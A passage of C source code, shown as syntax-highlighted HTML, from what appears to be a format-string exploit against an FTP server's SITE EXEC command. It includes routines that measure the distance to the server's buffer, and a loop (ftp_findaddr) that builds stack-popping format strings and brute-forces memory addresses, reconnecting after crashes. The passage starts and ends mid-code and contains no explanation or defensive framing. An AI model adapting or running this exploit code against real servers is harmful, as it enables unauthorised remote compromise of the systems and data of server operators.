            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6d6d6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bufsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sec</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">rb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0">      </span><span class="sc11">tv_start</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tv_cur</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bufsize</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">gettimeofday</span><span class="sc10">(&amp;</span><span class="sc11">tv_start</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">gettimeofday</span><span class="sc10">(&amp;</span><span class="sc11">tv_cur</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((((</span><span class="sc11">tv_cur</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tv_cur</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc11">tv_start</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tv_start</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1000000</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">net_rtimeout</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_READTIMEOUT</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">rb</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rb</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rb</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">bufsize</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc1">/* buffer full */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">net_rtimeout</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sec</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fd_set</span><span class="sc0">      </span><span class="sc11">rset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0">  </span><span class="sc11">tv</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">n</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">error</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">flags</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_GETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_NONBLOCK</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">rset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">rset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">tv</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sec</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">tv</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* now we wait until more data is received then the tcp low level watermark,
     * which should be setted to 1 in this case (1 is default)
     */</span><span class="sc0">

    </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">rset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tv</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ETIMEDOUT</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc1">/* socket readable ? */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">rset</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ETIMEDOUT</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_findaddr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">blipcount</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">ssiz</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">tend</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">popstackbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">fabuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">figure</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufsaddr_start</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufsaddr_end</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc1">/* 1. build pop stack buffer
         */</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_align</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">esc_ok</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* 2. build write buffer
         */</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">popstackbuf</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 %s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fabuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ssiz</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">508</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blipcount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blipcount</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">tend</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ssiz</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%%|x|%%.%ds"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* XXX: thx smiler */</span><span class="sc0">

        </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ftpsock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_login</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iptr</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">xpb_align</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
